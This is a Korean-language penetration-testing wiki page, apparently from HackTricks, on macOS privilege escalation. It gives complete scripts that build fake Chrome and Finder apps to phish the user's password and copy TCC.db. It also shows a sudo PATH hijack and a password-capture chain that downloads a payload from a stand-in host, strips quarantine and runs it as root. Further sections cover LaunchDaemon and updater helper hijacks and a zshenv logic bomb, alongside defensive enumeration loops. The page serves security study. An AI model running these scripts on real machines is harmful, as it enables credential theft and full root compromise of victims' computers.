# macOS 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## TCC 권한 상승

TCC 권한 상승을 찾으러 오셨다면 다음으로 이동하세요:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux 권한 상승

Linux 또는 기타 Unix 계열 시스템에 영향을 주는 많은 권한 상승 기법은 macOS에도 적용됩니다. 다음을 참조하세요:


{{#ref}}
../../linux-hardening/linux-basics/linux-privilege-escalation/README.md
{{#endref}}

## 사용자 상호작용

### Sudo Hijacking

원본 [Sudo Hijacking 기법은 Linux Privilege Escalation 게시물](../../linux-hardening/linux-basics/linux-privilege-escalation/index.html#sudo-hijacking)에서 확인할 수 있습니다.

하지만 macOS는 사용자가 **`sudo`**를 실행할 때 사용자의 **`PATH`**를 **유지합니다**. 즉, 이 공격을 수행하는 또 다른 방법은 피해자가 **sudo를 실행할 때** 실행하는 다른 바이너리를 **하이재킹하는 것**입니다:

```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
    whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```

터미널을 사용하는 사용자라면 **Homebrew가 설치되어 있을 가능성이 매우 높습니다**. 따라서 **`/opt/homebrew/bin`**의 바이너리를 hijack할 수 있습니다.

### Dock Impersonation

**social engineering**을 이용해 Dock에서 **예를 들어 Google Chrome을 사칭**하고 실제로는 자신의 스크립트를 실행할 수 있습니다.

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
몇 가지 제안:

- Dock에 Chrome이 있는지 확인하고, 있다면 해당 항목을 **제거**한 다음 Dock 배열에서 **같은 위치에 가짜 Chrome 항목을 추가**합니다.

<details>
<summary>Chrome Dock impersonation script</summary>

```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /Applications/Google\\\\ Chrome.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Google Chrome</string>
    <key>CFBundleIdentifier</key>
    <string>com.google.Chrome</string>
    <key>CFBundleName</key>
    <string>Google Chrome</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
몇 가지 제안:

- **Dock에서 Finder를 제거할 수 없으므로**, Dock에 추가하려면 가짜 Finder를 실제 Finder 바로 옆에 둘 수 있습니다. 그러려면 **가짜 Finder 항목을 Dock 배열의 맨 앞에 추가해야 합니다**.
- Dock에 배치하지 않고 그냥 열어도 됩니다. "Finder가 Finder를 제어하려고 함"은 그다지 이상하지 않습니다.
- 끔찍한 대화상자에서 암호를 묻지 않고 **root 권한으로 승격**하는 또 다른 방법은 Finder가 권한이 필요한 작업을 수행할 때 실제로 암호를 묻게 하는 것입니다.
  - Finder에 새 **`sudo`** 파일을 **`/etc/pam.d`**에 복사하도록 요청합니다. (암호를 묻는 메시지에는 "Finder가 sudo를 복사하려고 합니다"라고 표시됩니다.)
  - 새 **Authorization Plugin**을 복사하도록 Finder에 요청합니다. (파일 이름을 제어하여 암호를 묻는 메시지에 "Finder가 Finder.bundle을 복사하려고 합니다"라고 표시할 수 있습니다.)

<details>
<summary>Finder Dock 사칭 스크립트</summary>

```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *cmd = "open /System/Library/CoreServices/Finder.app & "
                "sleep 2; "
                "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
                "PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
                "echo $PASSWORD > /tmp/passwd.txt";
    system(cmd);
    return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleExecutable</key>
    <string>Finder</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.finder</string>
    <key>CFBundleName</key>
    <string>Finder</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleIconFile</key>
    <string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```

</details>

{{#endtab}}
{{#endtabs}}

### 비밀번호 프롬프트 phishing + sudo 재사용

Malware는 사용자 상호작용을 악용해 **sudo 권한이 있는 비밀번호를 캡처**하고 프로그래밍 방식으로 재사용하는 경우가 많습니다. 일반적인 흐름은 다음과 같습니다.

1. `whoami`로 로그인한 사용자를 확인합니다.
2. `dscl . -authonly "$user" "$pw"`가 성공을 반환할 때까지 **비밀번호 프롬프트를 반복합니다**.
3. 자격 증명을 캐시하고(예: `/tmp/.pass`) `sudo -S`(stdin으로 비밀번호 전달)로 권한이 필요한 작업을 수행합니다.

간단한 예시 체인:

```bash
user=$(whoami)
while true; do
  read -s -p "Password: " pw; echo
  dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```

도난당한 비밀번호는 이후 **`xattr -c`로 Gatekeeper quarantine을 해제**하고, LaunchDaemons 또는 기타 권한이 필요한 파일을 복사한 뒤, 추가 단계를 비대화형으로 실행하는 데 재사용할 수 있습니다.<sup>[[1]](#references)</sup>

## 최신 macOS 전용 벡터(2023–2026)

### 더 이상 사용되지 않는 `AuthorizationExecuteWithPrivileges`를 여전히 사용할 수 있음

`AuthorizationExecuteWithPrivileges`는 10.7에서 더 이상 사용되지 않도록 지정되었지만 **Sonoma/Sequoia에서도 여전히 작동합니다**. 다수의 상용 업데이터가 신뢰할 수 없는 경로를 지정해 `/usr/libexec/security_authtrampoline`을 호출합니다. 대상 바이너리에 사용자 쓰기 권한이 있다면 트로이 목마를 심고 정당한 프롬프트를 이용할 수 있습니다:

```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```

**위의 masquerading tricks**와 결합해 그럴듯한 password dialog를 표시합니다.


### Privileged helper / XPC triage

최신 third-party macOS privesc의 상당수는 같은 패턴을 따릅니다. **root LaunchDaemon**이 **`/Library/PrivilegedHelperTools`**에서 **Mach/XPC service**를 노출하고, helper가 **client를 검증하지 않거나**, **너무 늦게 검증하거나**(PID race), **사용자가 제어하는 path/script**를 사용하는 **root method**를 노출합니다. 이 버그 유형은 VPN client, game launcher 및 updater에서 발생한 최근 helper 버그 다수의 원인입니다.<sup>[[2]](#references)</sup>

빠른 triage 체크리스트:

```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
  echo "== $f =="
  codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
  strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```

다음과 같은 helper에 특히 주의하세요.

- `launchd`에 job이 로드된 상태로 남아 **uninstall 후에도** 계속 요청을 처리하는 경우
- **`/Applications/...`** 또는 non-root 사용자가 쓸 수 있는 다른 경로에서 스크립트를 실행하거나 설정을 읽는 경우
- race가 가능한 **PID 기반** 또는 **bundle-id만 사용하는** peer validation에 의존하는 경우

helper authorization 버그에 대한 자세한 내용은 [이 페이지](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md)를 확인하세요.

### PackageKit 스크립트 환경 상속 (CVE-2024-27822)

Apple이 **Sonoma 14.5**, **Ventura 13.6.7**, **Monterey 12.7.5**에서 수정하기 전까지, 사용자가 **`Installer.app`** / **`PackageKit.framework`**를 통해 시작한 설치는 **PKG 스크립트를 현재 사용자의 환경에서 root 권한으로 실행**할 수 있었습니다. 즉, 패키지가 **`#!/bin/zsh`**를 사용하면 피해자가 패키지를 설치할 때 공격자의 **`~/.zshenv`**를 불러와 root 권한으로 실행할 수 있었습니다.<sup>[[3]](#references)</sup>

이는 **logic bomb**로 특히 유용합니다. 사용자 계정에 foothold를 확보하고 쓸 수 있는 셸 시작 파일만 있으면 됩니다. 그런 다음 사용자가 취약한 **zsh 기반** 설치 프로그램을 실행할 때까지 기다리면 됩니다. 일반적으로 **MDM/Munki** 배포에는 적용되지 않습니다. 해당 배포는 root 사용자의 환경에서 실행되기 때문입니다.<sup>[[3]](#references)</sup>

```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```

설치 프로그램에 특화된 악용 기법을 더 자세히 알아보려면 [이 페이지](macos-files-folders-and-binaries/macos-installers-abuse.md)도 확인하세요.

### `.localized`를 통한 설치 대상 경로 충돌

일부 서드파티 설치 프로그램은 실행 파일 경로가 `/Applications/Target.app` 내부의 고정 경로로 지정된 root LaunchDaemon을 등록합니다. 공격자가 **다른 bundle identifier**를 사용해 해당 bundle을 먼저 만들 수 있다면, Installer는 미끼 bundle을 그대로 두고 실제 앱을 `/Applications/Target.localized/Target.app`에 설치할 수 있습니다. Daemon은 여전히 원래 경로를 가리킵니다. 따라서 미끼 bundle 안에 공격자가 제어하는 실행 파일이 나중에 root 권한으로 실행될 수 있습니다.<sup>[[8]](#references)</sup>

중요한 사전 조건은 다음과 같습니다.<sup>[[8]](#references)</sup>

1. 공격자가 예상된 애플리케이션 경로를 만들거나 제어할 수 있습니다.
2. 패키지가 충돌하는 bundle을 제거하지 않습니다.
3. 권한이 높은 작업이 해당 bundle 내부의 하드 코딩된 경로를 사용합니다.
4. 사용자 또는 MDM 워크플로가 패키지를 설치하고 작업을 등록합니다.

이동된 bundle을 찾은 다음, 다음 섹션의 열거 루프로 LaunchDaemon 대상을 검토하세요.<sup>[[8]](#references)</sup>

```bash
find /Applications -type d -name '*.localized' -prune -print
for app in /Applications/*.app; do
  [ -d "$app" ] && stat -f '%Su:%Sg %Sp %N' "$app"
done
```

더 안전한 설치 프로그램은 최종 번들 위치를 확인하고, 권한이 필요한 실행 파일을 `/Library/PrivilegedHelperTools` 같은 root 소유 위치에 둡니다. 또한 작업을 등록하거나 시작하기 전에 소유권과 코드 서명을 확인해야 합니다.<sup>[[8]](#references)</sup>

### Writable LaunchDaemon target hijack

LaunchDaemon plist는 root 소유일 수 있지만, `Program` 또는 첫 번째 `ProgramArguments` 항목이 사용자가 쓰기 가능한 디렉터리를 가리킬 수 있습니다. 실행 파일 권한만 확인하지 말고 **전체 경로**를 확인하세요. 상위 디렉터리에 쓰기 권한이 있으면 공격자는 root 소유 실행 파일의 이름을 바꾸고 같은 경로에 대체 파일을 만들 수 있습니다. 이 대체 파일은 다음에 작업이 시작될 때 root 권한으로 실행됩니다. 재부팅이나 일반적인 서비스 재시작만으로도 충분합니다. 공격자는 system domain에서 `launchctl bootstrap`을 실행할 권한이 없어도 됩니다.<sup>[[7]](#references)</sup>

각 대상과 바로 상위 디렉터리를 먼저 열거하세요:<sup>[[7]](#references)</sup>

```bash
for p in /Library/LaunchDaemons/*.plist; do
  target=$(plutil -extract Program raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] ||
    target=$(plutil -extract ProgramArguments.0 raw -o - "$p" 2>/dev/null)
  [ -n "$target" ] || continue
  printf '\n%s -> %s\n' "$p" "$target"
  ls -ld "$target" "$(dirname "$target")" 2>/dev/null
done
```

파일 또는 상위 디렉터리에 쓰기 권한이 있으면 원본 바이너리를 보존하고 해당 경로를 실행 가능한 payload로 교체합니다. 그런 다음 이미 로드된 daemon이 다시 시작될 때까지 기다립니다.<sup>[[7]](#references)</sup>

```bash
target=/path/from/the/plist
mv "$target" "$target.real"
cp /tmp/payload "$target"
chmod 755 "$target"
```

### XNU SMR 자격 증명 포인터 경쟁 상태 (CVE-2025-24118)

취약한 `kauth_cred_proc_update` 경로는 SMR reader가 잠금 없이 포인터를 읽는 동안 비원자적 `zalloc_ro_mut` API를 사용해 `proc_ro.p_ucred`를 업데이트했습니다. 공개된 트리거는 특별히 준비된 setgid 바이너리를 사용합니다. 한 스레드가 실 그룹 ID와 유효 그룹 ID를 전환하는 동안 다른 스레드는 `getgid()` 같은 syscall을 반복적으로 호출합니다.<sup>[[4]](#references)</sup>

```c
// Writer thread inside a setgid binary
while (1) {
    setgid(real_gid);
    setgid(effective_gid);
}
// Reader thread
while (1) observed_gid = getgid();
```

이를 바로 사용할 수 있는 root exploit이 아니라 **race primitive**로 취급하세요. 공개된 PoC는 찢어진 credential pointer를 보여 줍니다. 대개 kernel panic으로 끝납니다. 연구자는 Intel에서만 손상을 재현했으며, 결과로 생성된 credential object를 결정론적으로 제어하는 방법은 제시하지 않았습니다. Apple은 macOS 15.3에서 업데이트를 atomic pointer exchange로 변경했습니다.<sup>[[4]](#references)</sup>

### Migration Assistant를 통한 SIP 우회 ("Migraine", CVE-2023-32369)

이미 root 권한이 있어도 SIP는 시스템 위치에 대한 쓰기를 차단합니다. **Migraine** bug는 Migration Assistant entitlement `com.apple.rootless.install.heritable`을 악용해 SIP 우회 권한을 상속하는 child process를 실행하고, 보호된 경로(예: `/System/Library/LaunchDaemons`)를 덮어씁니다.<sup>[[5]](#references)</sup> 공격 체인은 다음과 같습니다.

1. 실행 중인 시스템에서 root 권한을 획득합니다.
2. 조작된 상태를 사용해 `systemmigrationd`가 공격자가 제어하는 binary를 실행하도록 유도합니다.
3. 상속된 entitlement를 사용해 SIP 보호 파일을 수정합니다. 수정 사항은 재부팅 후에도 유지됩니다.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

여러 Apple daemon은 XPC를 통해 **NSPredicate** object를 받고, 공격자가 제어할 수 있는 `expressionType` field만 검증합니다. 임의의 selector를 실행하는 predicate를 조작하면 **root/system XPC service**(예: `coreduetd`, `contextstored`)에서 **code execution**을 달성할 수 있습니다. 이를 초기 app sandbox escape와 결합하면 **사용자 확인 없이 권한 상승**이 가능합니다. predicate를 역직렬화하지만 견고한 visitor가 없는 XPC endpoint를 찾아보세요.<sup>[[6]](#references)</sup>

## TCC - Root 권한 상승

### CVE-2020-9771 - mount_apfs TCC 우회 및 권한 상승

**모든 사용자**(권한이 없는 사용자 포함)는 `-o noowners` 옵션으로 Time Machine snapshot을 생성하고 마운트해 해당 snapshot의 **모든 파일에 접근**할 수 있습니다. 이를 통해 live volume의 ownership 검사를 우회합니다. 필요한 유일한 권한은 사용한 애플리케이션(예: `Terminal`)에 **Full Disk Access** (`kTCCServiceSystemPolicyAllfiles`) 권한이 있는 것입니다.

명령어와 전체 설명은 TCC 우회 페이지에 있습니다.

{{#ref}}
macos-security-protections/macos-tcc/macos-tcc-bypasses/README.md
{{#endref}}

## 민감한 정보

다음은 권한 상승에 유용할 수 있습니다.


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}



## References

- [1] [Pentest Partners - 2025년, Infostealer의 해](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [CVE-2024-30165: macOS용 AWS Client VPN 로컬 권한 상승](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)
- [3] [CVE-2024-27822: macOS PackageKit 권한 상승](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [4] [TRAVERTINE: CVE-2025-24118](https://jprx.io/cve-2025-24118/)
- [5] [Microsoft "Migraine" SIP 우회 (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [6] [Trellix Advanced Research Center - macOS 및 iOS의 새로운 권한 상승 bug class (CVE-2023-23530/23531)](https://www.trellix.com/en-sg/blogs/research/trellix-advanced-research-center-discovers-a-new-privilege-escalation-bug-class-on-macos-and-ios/)
- [7] [LaunchDaemon 하이재킹: 안전하지 않은 폴더 권한을 통한 권한 상승 및 지속성 확보](https://bradleyjkemp.dev/post/launchdaemon-hijacking/)
- [8] [`.localized` 디렉터리를 통한 macOS LPE](https://theevilbit.github.io/posts/localized/)
{{#include ../../banners/hacktricks-training.md}}
